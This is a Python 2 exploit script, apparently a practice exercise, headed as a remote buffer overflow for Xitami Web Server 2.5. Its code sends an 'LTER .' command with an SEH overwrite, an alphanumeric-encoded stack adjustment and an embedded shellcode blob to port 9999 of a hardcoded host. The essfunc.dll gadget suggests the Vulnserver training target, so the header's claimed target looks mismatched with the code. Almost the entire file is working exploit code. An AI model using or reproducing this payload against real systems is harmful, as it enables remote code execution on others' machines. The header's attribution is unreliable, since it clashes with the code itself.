#!/usr/bin/python
#Author: Samir Sanchez garnica @sasaga92
#Exploit: Xitami Web Server 2.5 Remote Buffer Overflow (SEH + Egghunter)

import sys
import socket
import random
import string
import struct

def pattern_create(_type,_length):
  _type = _type.split(" ")

  if _type[0] == "trash":
    return _type[1] * _length
  elif _type[0] == "random":
    return ''.join(random.choice(string.lowercase) for i in range(_length))
  elif _type[0] == "pattern":
    _pattern = ''
    _parts = ['A', 'a', '0']
    while len(_pattern) != _length:
      _pattern += _parts[len(_pattern) % 3]
      if len(_pattern) % 3 == 0:
        _parts[2] = chr(ord(_parts[2]) + 1)
        if _parts[2] > '9':
          _parts[2] = '0'
          _parts[1] = chr(ord(_parts[1]) + 1)
          if _parts[1] > 'z':
            _parts[1] = 'a'
            _parts[0] = chr(ord(_parts[0]) + 1)
            if _parts[0] > 'Z':
              _parts[0] = 'A'
    return _pattern
  else:
    return "Not Found"

def pwned(_host, _port, _payload):
    print "[*] Conectandose a {0}:{1}...".format(_host, _port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((_host, _port))
    print "[*] Conectado, Enviando payload {0} bytes...".format(len(_payload))
    _payload = "{0}\r\n\r\n".format(_payload, _host)
    print _payload
    s.send(_payload)
    s.close
    print "[+] Payload de {0} bytes Enviado.".format(len(_payload))

def main():

  #_nseh = "\xeb\xae\x90\x90" #jmp negative
  #_seh = "\x87\x1D\x40" #0x004046B2 pop esi #pop ebx #retn
  #_egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

  _shellcode = ("\xba\xa2\xcf\xad\x8d\xdb\xd1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
  "\x7e\x83\xee\xfc\x31\x56\x11\x03\x56\x11\xe2\x57\x70\xe4\x08"
  "\x09\x2d\x2e\xd1\xec\x46\xf5\x22\x56\x96\x3c\x7b\x1e\x5b\x7e"
  "\x78\xef\x23\x71\x82\x3e\x5f\xf1\xd3\x58\x3b\x53\x30\xe6\xbc"
  "\x82\xb3\xba\xf5\xdf\x9e\x21\x78\xcd\x8d\x25\x87\x5b\xd4\xfd"
  "\x6c\xcd\xcf\x7b\x68\x84\x3d\x07\xcb\x1e\x1b\x06\x11\x31\xfd"
  "\x90\x27\xff\xe6\x22\x4d\xdd\x1a\xc9\xe1\x93\x45\x4b\x13\x48"
  "\x74\xcc\x45\x07\x95\xd1\x38\xde\xa3\xef\x7d\x68\xb0\xd1\x67"
  "\x60\xe5\x89\xb5\xf7\x3e\x2f\x49\xd7\xb8\xc0\xc6\x1b\xfc\xe2"
  "\xbb\xc8\xae\x39\x78\x81\x4d\xc4\x1c\x2d\x16\x6d\xc3\x04\xde"
  "\x58\x43\x4e\xc5\x60\x46\x4b\xc9\x79\xfb\x32\xdd\x46\xb8\xd4"
  "\x61\x62\x92\xf6\xe8\x7b\xe8\x41\xc0\xee\xe2\xbb\x64\x6c\xb8"
  "\x43\x2d\xfd\xda\x61\xb0\x7c\xe6\x36\xab\x3e\x7a\x80\xe6\x60"
  "\x2b\x52\x1d\x53\xed\xb4\x94\x86\x8b\x66\x26\x56\x67\xe0\x7c"
  "\xfb\x1c\xb9\x4f\x75\x4e\x7d\x63\xac\xbc\x7e\x90\xfd\xa1\xb2"
  "\x6b\x06\xb4\x92\x1f\x90\x26\x1a\x4f\x3d\x18\xa2\x3c\x72\x0f"
  "\x93\x37\xf7\xf3\x5a\x7f\x33\xbf\x9f\xc2\xea\xb9\x13\x6c\x77"
  "\xb6\xd4\xc0\x37\x86\x78\xd3\x86\x8c\x9f\x3a\x0f\xb1\x5e\x0f"
  "\xb9\x09\xf1\x0c\xe9\x2f\xb7\xd7\xea\x37\x4f\x6a\xc3\xdb\x7b"
  "\x48\x32\x05\xd4\x48\xcc\x47\x59\x41\xc5\x0b\xf5\x02\xeb\x06"
  "\x7f\xae\x25\x2b\x16\x2d\x51\x18\x91\x9c\x96\x32\x17\x1c\x6e"
  "\x95\xb9\x4e\xf5\xa6\x29\x8b\x30\x48\x07\x55\xf1\xe4\xa8\xe2"
  "\x4d\xe0\x6a\xef\xd3\x4e\x07\x4d\xb2\x25\xe0\xb2\x33\x1b\xdc"
  "\x50\xac\x59\x35\xd9\x91\x9c\x44\x5a\xc1\x52\x19\x0f\x03\xc9"
  "\x1d\x71\xe5\x79\x54\x3d\xc0\x87\x4d\x9f\x9d\x69\x09\xd4\x6b"
  "\xe2\xa5\xe0\x77\xd0\xb9\xbd\x85\xd0\x35\xcb\x59\x78\x22\xf2"
  "\x25\x78\x64\xf6\x2a\x8d\x3e\xc8\xce\x7c\x6f\x64\x24\xb4\x2c"
  "\x14\xd5\xff\x9c\x84\x40\xf1\x74\xcf\x3c\x4f\xac\x2c\xe2\xae"
  "\xaa\xaf\xb0\xcf\xc8\x31\x30\xb3\xb0\x8b\x08\x25\x2d\x95\x3d"
  "\xf5\x0c\x1f\x23\xd9\x87\x31\x79\xd2\x8d\xad\x59\xdd\xb0\x4c"
  "\xa4\x17\xeb\x97\xb0\x90\x3c\x45\xb7\x3f\x2b\x04\xf3\xc6\xe8"
  "\x56\x25\x7a\xfd\x6e\x3b\xef\x64\x14\x9b\x67\x08\x9c\x47\x73"
  "\x24\x1e\x1e\xc6\xd2\xad\xcc\x0c\xc8\xbb\x4e\x12\xde\xf5\x35"
  "\x25\xe0\xb0\xef\x04\xb5\x29\x62\xc6\x56\x44\x52\x16\xa3\x63"
  "\x63\xcd\xd1\xc9\x45\x87\x3b\xd6\x4b\x7a\x24\xd5\xd4\x7d\x4c"
  "\x83\x06\x16\x88\x7f")
 
  _host = "192.168.236.135"
  _port = 9999

  #_offset_eip = 3498
  _offset_eip = 3518
  _nseh = struct.pack("<L",0xff774242) 
  _seh  = struct.pack("<L",0x6250160A) #625011BF pop ebx # pop ebx # retn essfunc.dll
  _esp = "\x25\x41\x4D\x4E\x55\x25\x35\x32\x31\x2A\x54\x58\x2D\x70\x70\x7C\x7C\x2D\x20\x40\x43\x43\x2D\x28\x35\x40\x40\x50\x5C"
  _jmp_negative = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x34\x72\x77\x77\x05\x23\x61\x66\x66\x05\x23\x52\x55\x55\x2D\x33\x33\x33\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x21\x21\x21\x75\x05\x20\x20\x20\x74\x50"
  _break = 5000
  
  _inject = "LTER ."
  _inject += "A" * (_offset_eip - len(_esp) - 80)
  _inject += _esp
  #_inject += _jmp_negative
  _inject += "A"*80
  _inject += _nseh
  _inject += _seh
  _inject += pattern_create("trash B", _break - len(_inject))

  pwned(_host,_port,_inject)

if __name__ == "__main__":
	main()